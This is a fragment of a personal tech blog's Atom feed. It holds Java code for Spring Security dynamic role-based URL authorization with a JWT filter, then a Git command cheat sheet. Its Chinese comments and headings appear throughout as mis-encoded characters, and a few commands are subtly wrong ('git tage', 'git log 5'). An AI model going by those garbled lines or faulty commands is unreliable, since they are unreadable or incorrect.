class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;ConfigAttribute&gt; <span class="title function_">getAttributes</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        <span class="comment">//è·å–è¯·æ±‚çš„url</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">requestUrl</span> <span class="operator">=</span> ((FilterInvocation) o).getRequestUrl();</span><br><span class="line">        List&lt;Menu&gt; menus = menuService.getMenusWithRole();</span><br><span class="line">        <span class="keyword">for</span> (Menu menu : menus) &#123;</span><br><span class="line">            <span class="comment">//åˆ¤æ–­è¯·æ±‚urlä¸èœå•è§’è‰²æ˜¯å¦åŒ¹é…</span></span><br><span class="line">            <span class="keyword">if</span> (antPathMatcher.match(menu.getUrl(),requestUrl)) &#123;</span><br><span class="line">                <span class="comment">//å¾—åˆ°rnameï¼Œå¹¶å°†å…¶æ”¾å…¥ä¸€ä¸ªstringé›†åˆä¸­,ä¸€ä¸ªurlå¯èƒ½å¯¹åº”å¤šä¸ªè§’è‰²</span></span><br><span class="line">                String[] str = menu.getRoles().stream().map(Role::getName).toArray(String[]::<span class="keyword">new</span>);</span><br><span class="line">                <span class="comment">//å°†å¾—åˆ°çš„è§’è‰²æ”¾å…¥Listé‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> SecurityConfig.createList(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//ç»™ä¸€ä¸ªé»˜è®¤ç™»å½•å³å¯è®¿é—®è§’è‰²</span></span><br><span class="line">        <span class="keyword">return</span> SecurityConfig.createList(<span class="string">&quot;ROLE_LOGIN&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;ConfigAttribute&gt; <span class="title function_">getAllConfigAttributes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">supports</span><span class="params">(Class&lt;?&gt; aClass)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="æˆæƒç®¡ç†">æˆæƒç®¡ç†</span></h3><blockquote><p>AccessDecisionManager</p><p>ç”¨æˆ·GrantedAuthorityä¸ConfigAttributeä¸€å¯¹æ¯”å°±çŸ¥é“ç”¨æˆ·æœ‰æ²¡æœ‰æƒé™è®¿é—®è¯¥apiäº†</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Authentication authentication</span></span><br><span class="line"><span class="comment"> * è®¤è¯ä¹‹åçš„èº«ä»½</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Object o</span></span><br><span class="line"><span class="comment"> * Objectå¯¹è±¡è¿™é‡Œæ˜¯è¦è®¿é—®çš„å—ä¿æŠ¤èµ„æºï¼Œä»–æ˜¯ä¸€ä¸ªFilterInvocationç±»å‹,ä½ å¯ä»¥é€šè¿‡è¿™ä¸ªå¯¹è±¡è·å–å½“å‰æ‰€è®¿é—®çš„è·¯å¾„</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Collection&lt;ConfigAttribute&gt; configAttributes</span></span><br><span class="line"><span class="comment"> * Collectioné›†åˆå°±æ˜¯è¦æ“ä½œå½“å‰èµ„æºï¼Œæ‰€éœ€è¦çš„è§’è‰²ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/weixin_43836204/article/details/106310730</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decide</span><span class="params">(Authentication authentication, Object o, Collection&lt;ConfigAttribute&gt; configAttributes)</span> <span class="keyword">throws</span> AccessDeniedException, InsufficientAuthenticationException &#123;</span><br><span class="line">    <span class="keyword">for</span> (ConfigAttribute attribute : configAttributes) &#123;</span><br><span class="line">        <span class="comment">//å½“å‰urlèµ„æºæ‰€éœ€è§’è‰²</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">needRole</span> <span class="operator">=</span> attribute.getAttribute();</span><br><span class="line">        <span class="comment">//åˆ¤æ–­ç”¨æˆ·è§’è‰²æ˜¯å¦ä¸ºurlæ‰€éœ€è§’è‰²</span></span><br><span class="line">        Collection&lt;? <span class="keyword">extends</span> <span class="title class_">GrantedAuthority</span>&gt; authorities = authentication.getAuthorities();</span><br><span class="line">        <span class="keyword">for</span> (GrantedAuthority authority : authorities) &#123;</span><br><span class="line">            <span class="keyword">if</span> (authority.getAuthority().equals(needRole)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//åˆ¤æ–­è§’è‰²æ˜¯å¦æ˜¯ç™»å½•å³å¯è®¿é—®çš„è§’è‰²ï¼Œæ­¤è§’è‰²åœ¨CustomFilterä¸­è®¾ç½®</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;ROLE_LOGIN&quot;</span>.equals(needRole)) &#123;</span><br><span class="line">            <span class="comment">//åˆ¤æ–­æ˜¯å¦ç™»å½•</span></span><br><span class="line">            <span class="keyword">if</span> (authentication <span class="keyword">instanceof</span> AnonymousAuthenticationToken) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessDeniedException</span>(<span class="string">&quot;å°šæœªç™»å½•ï¼Œè¯·ç™»å½•&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessDeniedException</span>(<span class="string">&quot;æƒé™ä¸è¶³ï¼Œè¯·è”ç³»ç®¡ç†å‘˜&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="æˆæƒé”™è¯¯å¤„ç†å™¨">æˆæƒé”™è¯¯å¤„ç†å™¨</span></h3><blockquote><p>AccessDeniedHandler</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: cowork-back</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: å½“è®¿é—®æ¥å£æ²¡æƒé™æ—¶ï¼Œè‡ªå®šä¹‰è¿”å›ç»“æœ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: disda</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2022-01-24 15:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestfulAccessDeniedHandler</span> <span class="keyword">implements</span> <span class="title class_">AccessDeniedHandler</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AccessDeniedException e)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        httpServletResponse.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        httpServletResponse.setContentType(<span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> httpServletResponse.getWriter();</span><br><span class="line">        <span class="type">RespBean</span> <span class="variable">bean</span> <span class="operator">=</span> RespBean.error(<span class="string">&quot;æƒé™ä¸è¶³ï¼Œè¯·è”ç³»ç®¡ç†å‘˜ï¼&quot;</span>);</span><br><span class="line">        bean.setCode(<span class="number">403</span>);</span><br><span class="line">        out.write(<span class="keyword">new</span> <span class="title class_">ObjectMapper</span>().writeValueAsString(bean));</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="é…ç½®æˆæƒè¿‡æ»¤å™¨">é…ç½®æˆæƒè¿‡æ»¤å™¨</span></h3><blockquote><p>OncePerRequestFilter</p></blockquote><ul><li>jwtç‰ˆæœ¬</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.disda.cowork.config.security.components;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.authentication.UsernamePasswordAuthenticationToken;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.context.SecurityContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetails;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetailsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.authentication.WebAuthenticationDetailsSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.filter.OncePerRequestFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: cowork-back</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: jwt ç™»å½•æˆæƒè¿‡æ»¤å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: disda</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2022-01-24 14:52</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtAuthenticationTokenFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jwt.tokenHeader&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String tokenHeader;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jwt.tokenHead&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String tokenHead;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JwtTokenUtil jwtTokenUtil;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserDetailsService userDetailsService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * æµè§ˆå™¨ä¼ è¿‡æ¥çš„requestè¯·æ±‚ä¸­</span></span><br><span class="line"><span class="comment">         * key value</span></span><br><span class="line"><span class="comment">         * keyä¸ºé…ç½®ä¸­çš„tokenHeader</span></span><br><span class="line"><span class="comment">         * valueä¸ºé…ç½®ä¸­çš„tokenHead+ç©ºæ ¼+token</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">authHeader</span> <span class="operator">=</span> request.getHeader(tokenHeader);</span><br><span class="line">        <span class="comment">// å­˜åœ¨token</span></span><br><span class="line">        <span class="keyword">if</span>(authHeader!=<span class="literal">null</span>&amp;&amp;authHeader.startsWith(tokenHead))&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">authToken</span> <span class="operator">=</span> authHeader.substring(tokenHead.length());</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> jwtTokenUtil.getUserNameFromToken(authToken);</span><br><span class="line">            <span class="comment">// tokenå­˜åœ¨ç”¨æˆ·åï¼Œä½†æ˜¯æœªç™»å½•</span></span><br><span class="line">            <span class="keyword">if</span>(username!=<span class="literal">null</span> &amp;&amp; SecurityContextHolder.getContext().getAuthentication() == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="comment">// ç™»å½•</span></span><br><span class="line">                <span class="type">UserDetails</span> <span class="variable">userDetails</span> <span class="operator">=</span> userDetailsService.loadUserByUsername(username);</span><br><span class="line">                <span class="comment">// éªŒè¯Tokenæ˜¯å¦æœ‰æ•ˆï¼Œé‡æ–°è®¾ç½®ç”¨æˆ·å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">if</span>(jwtTokenUtil.validateToken(authToken,userDetails))&#123;</span><br><span class="line">                    <span class="type">UsernamePasswordAuthenticationToken</span> <span class="variable">authenticationToken</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordAuthenticationToken</span>(userDetails,<span class="literal">null</span>,userDetails.getAuthorities());</span><br><span class="line">                    authenticationToken.setDetails(<span class="keyword">new</span> <span class="title class_">WebAuthenticationDetailsSource</span>().buildDetails(request));</span><br><span class="line">                    SecurityContextHolder.getContext().setAuthentication(authenticationToken);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="é…ç½®spring-security">é…ç½®Spring Security</span></h3><blockquote><p>SecurityConfig extends WebSecurityConfigurerAdapter</p></blockquote><ul><li>jwtç‰ˆæœ¬</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//ä½¿ç”¨JWTï¼Œä¸éœ€è¦csrfï¼Œå…³é—­csrfé˜²èŒƒ</span></span><br><span class="line">    http</span><br><span class="line">            .csrf().disable()</span><br><span class="line">            <span class="comment">//åŸºäºtokenï¼Œä¸éœ€è¦session</span></span><br><span class="line">            .sessionManagement()</span><br><span class="line">            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)</span><br><span class="line">            .and()</span><br><span class="line">            <span class="comment">//æˆæƒè®¤è¯</span></span><br><span class="line">            .authorizeRequests()</span><br><span class="line">            <span class="comment">//æ‰€æœ‰è¯·æ±‚éƒ½è¦æ±‚è®¤è¯,å¿…é¡»ç™»å½•åè¢«è®¿é—®</span></span><br><span class="line">            .anyRequest().authenticated()</span><br><span class="line">            <span class="comment">//åŠ¨æ€æƒé™é…ç½®</span></span><br><span class="line">            .withObjectPostProcessor(<span class="keyword">new</span> <span class="title class_">ObjectPostProcessor</span>&lt;FilterSecurityInterceptor&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> &lt;O <span class="keyword">extends</span> <span class="title class_">FilterSecurityInterceptor</span>&gt; O <span class="title function_">postProcess</span><span class="params">(O object)</span> &#123;</span><br><span class="line">                    object.setAccessDecisionManager(customUrlDecisionManager);</span><br><span class="line">                    object.setSecurityMetadataSource(customFilter);</span><br><span class="line">                    <span class="keyword">return</span> object;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            .and()</span><br><span class="line">            <span class="comment">//ç¦ç”¨ç¼“å­˜</span></span><br><span class="line">            .headers()</span><br><span class="line">            .cacheControl();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ·»åŠ jwt ç™»å½•æˆæƒè¿‡æ»¤å™¨</span></span><br><span class="line">    http.addFilterBefore(jwtAuthencationTokenFilter(), UsernamePasswordAuthenticationFilter.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¼‚å¸¸å¤„ç†</span></span><br><span class="line">    <span class="comment">// æ·»åŠ è‡ªå®šä¹‰æœªæˆæƒå’Œæœªç™»å½•ç»“æœè¿”å›</span></span><br><span class="line">    http.exceptionHandling()</span><br><span class="line">            .accessDeniedHandler(restfulAccessDeniedHandler)</span><br><span class="line">            .authenticationEntryPoint(restAuthorizationEntryPoint);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="é¢ç»" scheme="https://disda-coding.github.io/categories/%E9%9D%A2%E7%BB%8F/"/>
    
    
    <category term="Spring" scheme="https://disda-coding.github.io/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Gitæ“ä½œ</title>
    <link href="https://disda-coding.github.io/2022/04/22/git/"/>
    <id>https://disda-coding.github.io/2022/04/22/git/</id>
    <published>2022-04-22T02:14:09.000Z</published>
    <updated>2023-03-29T01:03:37.104Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">åŸºæœ¬æ“ä½œ</a></li><li><a href="#%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6">ç‰ˆæœ¬æ§åˆ¶</a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93">è¿œç¨‹ä»“åº“</a></li><li><a href="#%E5%88%86%E6%94%AF">åˆ†æ”¯</a></li><li><a href="#%E6%A0%87%E7%AD%BErelease-%E5%8F%91%E8%A1%8C%E7%89%88">æ ‡ç­¾Release å‘è¡Œç‰ˆ</a></li><li><a href="#idea">Idea</a></li></ul><!-- tocstop --><h2><span id="åŸºæœ¬æ“ä½œ">åŸºæœ¬æ“ä½œ</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git init <span class="comment"># æ–°å»ºgitä»“åº“</span></span><br><span class="line">git add &lt;filename/directory/.&gt; <span class="comment"># å°†å·¥ä½œåŒºçš„æ–‡ä»¶ã€ç›®å½•ã€æ‰€æœ‰æ–‡ä»¶æ·»åŠ åˆ°stage</span></span><br><span class="line">git commit -m <span class="string">&quot;commit&quot;</span> <span class="comment"># å°†stageçš„æ–‡ä»¶æ·»åŠ åˆ°ç‰ˆæœ¬åº“ä¸­</span></span><br><span class="line">git commit -am <span class="string">&quot;commit&quot;</span> <span class="comment"># ä¸Šä¸¤æ­¥åˆäºŒä¸ºä¸€</span></span><br><span class="line">git commit -a <span class="comment"># æ›´åŠ ç®€åŒ–</span></span><br><span class="line">git status <span class="comment"># æŸ¥çœ‹gitçŠ¶æ€</span></span><br><span class="line">git <span class="built_in">log</span> <span class="comment"># æŸ¥çœ‹æäº¤æ—¥å¿—</span></span><br><span class="line">git <span class="built_in">log</span> 5 --pretty=oneline <span class="comment"># æ–¹ä¾¿æŸ¥çœ‹æ—¥å¿—</span></span><br><span class="line">git diff <span class="comment"># æŸ¥çœ‹åŒºåˆ«</span></span><br><span class="line">git <span class="built_in">rm</span> filename <span class="comment"># åˆ é™¤æ–‡ä»¶</span></span><br><span class="line">git ls-files <span class="comment"># æŸ¥çœ‹æœ¬åœ°ä»“åº“æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h2><span id="ç‰ˆæœ¬æ§åˆ¶">ç‰ˆæœ¬æ§åˆ¶</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD <span class="comment"># å°†stageä¸­çš„æ–‡ä»¶æ¸…ç©ºï¼ˆæ’¤é”€git addæ“ä½œï¼‰</span></span><br><span class="line">git reset --hard HEAD^^ <span class="comment"># æ‰€æœ‰åŒºåŸŸå›é€€åˆ°ä¸Šä¸Šä¸ªç‰ˆæœ¬ å–å†³äº^çš„æ•°é‡</span></span><br><span class="line">git reset --hard HEAD~1 <span class="comment"># å›é€€ä¸€ä¸ªç‰ˆæœ¬</span></span><br><span class="line">git reset --hard æ ‡è¯†ç¬¦ <span class="comment"># å›é€€åˆ°æŸä¸ªç‰ˆæœ¬ï¼Œè¾“å…¥5ä½+ï¼Œä¸é‡å¤å³å¯</span></span><br><span class="line">git reflog <span class="comment"># æŸ¥çœ‹ä¹‹å‰çš„å¼•ç”¨ä½ç½®ï¼Œé˜²æ­¢æ— æ³•å›æ»š</span></span><br><span class="line"></span><br><span class="line">git checkout --filename <span class="comment">#æ¢å¤å·²æäº¤çš„è¯¯åˆ é™¤å·¥ä½œåŒºçš„æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h2><span id="è¿œç¨‹ä»“åº“">è¿œç¨‹ä»“åº“</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> url <span class="comment"># ä¸‹è½½è¿œç¨‹ä»“åº“é¡¹ç›®</span></span><br><span class="line">git push origin branch <span class="comment"># æ¨é€æœ¬åœ°åˆ†æ”¯åˆ°è¿œç¨‹</span></span><br><span class="line">git push origin :remote_branch <span class="comment"># åˆ é™¤è¿œç¨‹åˆ†æ”¯</span></span><br><span class="line">git checkout -b local_branch origin/remote_branch <span class="comment"># æ‹‰å–è¿œç¨‹æŒ‡å®šåˆ†æ”¯å¹¶åœ¨æœ¬åœ°åˆ›å»ºåˆ†æ”¯</span></span><br><span class="line">git fetch <span class="comment"># è·å–åˆ†æ”¯</span></span><br><span class="line">git pull <span class="comment"># æ‹‰å–æœ€æ–°å†…å®¹</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;å¤šäººåä½œ&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># æäº¤å‰å…ˆpull</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="åˆ†æ”¯">åˆ†æ”¯</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git checkout branch <span class="comment"># åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯</span></span><br><span class="line">git checkout -b new_branch <span class="comment"># æ–°å»ºåˆ†æ”¯å¹¶åˆ‡æ¢åˆ°æ–°å»ºåˆ†æ”¯</span></span><br><span class="line">git branch -d branch <span class="comment"># åˆ é™¤æŒ‡å®šåˆ†æ”¯</span></span><br><span class="line">git branch <span class="comment"># æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯ *ä»£è¡¨ç›®å‰åˆ†æ”¯</span></span><br><span class="line">git branch -m oldBranch newBranch é‡å‘½ååˆ†æ”¯</span><br><span class="line">git branch -a <span class="comment"># æŸ¥çœ‹æœ¬åœ°å’Œè¿œç¨‹åˆ†æ”¯</span></span><br></pre></td></tr></table></figure><h2><span id="æ ‡ç­¾release-å‘è¡Œç‰ˆ">æ ‡ç­¾Release å‘è¡Œç‰ˆ</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git tag tagName <span class="comment"># æ–°å»ºæ ‡ç­¾ é»˜è®¤ä¸ºHEAD</span></span><br><span class="line">git tage -a tag_name -m <span class="string">&#x27;xx&#x27;</span> <span class="comment"># æ·»åŠ æ ‡ç­¾å¹¶æŒ‡å®šæè¿°ä¿¡æ¯</span></span><br><span class="line">git tag <span class="comment"># æŸ¥çœ‹æ‰€æœ‰æ ‡ç­¾</span></span><br><span class="line">git tag -d tag_name <span class="comment"># åˆ é™¤æœ¬åœ°æ ‡ç­¾</span></span><br><span class="line">git push origin tag_name <span class="comment"># æ¨é€æœ¬åœ°æ ‡ç­¾åˆ°è¿œç¨‹</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="idea">Idea</span></h2><ul><li>ä¸‹è½½æ’ä»¶.ignore</li></ul>]]></content>
    
    
      
      
